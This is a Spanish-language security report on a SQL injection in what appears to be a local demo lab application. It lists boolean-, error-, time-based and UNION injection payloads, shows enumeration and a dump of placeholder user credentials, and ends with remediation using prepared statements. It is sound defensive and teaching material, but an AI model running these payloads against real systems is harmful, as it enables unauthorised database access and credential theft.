# Informe de Análisis de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:45:39  
**Tipo de análisis:** SQL Injection  

---

## 1. Resumen Ejecutivo

Se detectó y explotó exitosamente una vulnerabilidad de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La vulnerabilidad permitió extraer la base de datos completa, incluyendo credenciales de todos los usuarios del sistema.

---

## 2. Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (Error-based, Boolean-based blind, Time-based blind, UNION-based) |
| **URL afectada** | `http://web.dev.local:8083/?id=1&Submit=Submit` |
| **Parámetro vulnerable** | `id` (método GET) |
| **CVSS (estimado)** | 9.8 (Crítico) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |

---

## 3. Prueba de Concepto

### 3.1 Confirmación de la vulnerabilidad

Al enviar una comilla simple en el parámetro `id`, el servidor devuelve un error SQL que revela la estructura de la consulta:

**Payload:** `?id=1'&Submit=Submit`

**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma que el parámetro es vulnerable a SQL injection y que la aplicación utiliza **MariaDB** como motor de base de datos.

### 3.2 Tipos de inyección identificados

Mediante sqlmap se confirmaron los siguientes tipos de inyección:

1. **Boolean-based blind:** `id=1' OR NOT 9498=9498#`
2. **Error-based (EXTRACTVALUE):** `id=1' AND EXTRACTVALUE(4916,CONCAT(0x5c,...))-- XbML`
3. **Time-based blind (SLEEP):** `id=1' AND (SELECT 9954 FROM (SELECT(SLEEP(5)))VhDO)-- ciFu`
4. **UNION query (2 columnas):** `id=1' UNION ALL SELECT NULL,CONCAT(...)#`

---

## 4. Explotación

### 4.1 Enumeración de bases de datos

```
Bases de datos disponibles:
  [*] information_schema
  [*] mysql
  [*] performance_schema
  [*] sqli_demo   <-- Base de datos objetivo
  [*] sys
```

### 4.2 Enumeración de tablas en `sqli_demo`

```
Database: sqli_demo
[1 tabla]
+-------+
| users |
+-------+
```

### 4.3 Volcado de la tabla `users`

```
Database: sqli_demo
Table: users
[8 registros]
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

---

## 5. Información del Entorno

| Componente | Versión |
|------------|---------|
| **Sistema Operativo** | Linux Debian |
| **Servidor Web** | Apache 2.4.65 |
| **Lenguaje** | PHP 8.1.33 |
| **Base de datos** | MySQL 5 (MariaDB fork) |
| **Archivo vulnerable** | `/var/www/html/low.php` (línea 11) |

---

## 6. Causa Raíz

El archivo `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin sanitización ni uso de consultas preparadas (prepared statements):

```php
// Ejemplo de código vulnerable (inferido del error):
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## 7. Impacto

- **Confidencialidad:** ALTO — Acceso completo a todas las credenciales de usuarios
- **Integridad:** ALTO — Posibilidad de modificar, insertar o eliminar registros
- **Disponibilidad:** MEDIO — Posibilidad de eliminar tablas o bases de datos
- **Escalada de privilegios:** Posible acceso a otras bases de datos del servidor (mysql, sys)

---

## 8. Recomendaciones

1. **Usar Prepared Statements / Consultas parametrizadas:**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar el input:** Verificar que el parámetro `id` sea estrictamente un entero.

3. **Configurar error reporting:** Deshabilitar la visualización de errores SQL en producción para evitar la fuga de información.

4. **Principio de mínimo privilegio:** El usuario de base de datos utilizado por la aplicación no debería tener acceso a otras bases de datos del servidor.

5. **WAF (Web Application Firewall):** Implementar reglas para detectar y bloquear patrones de SQL injection.

---

## 9. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection en el parámetro `id`. Esta vulnerabilidad fue explotada exitosamente, permitiendo la extracción completa de la base de datos `sqli_demo`, incluyendo los nombres de usuario, correos electrónicos y contraseñas en texto plano de 8 usuarios. Se recomienda corrección inmediata mediante el uso de consultas parametrizadas.
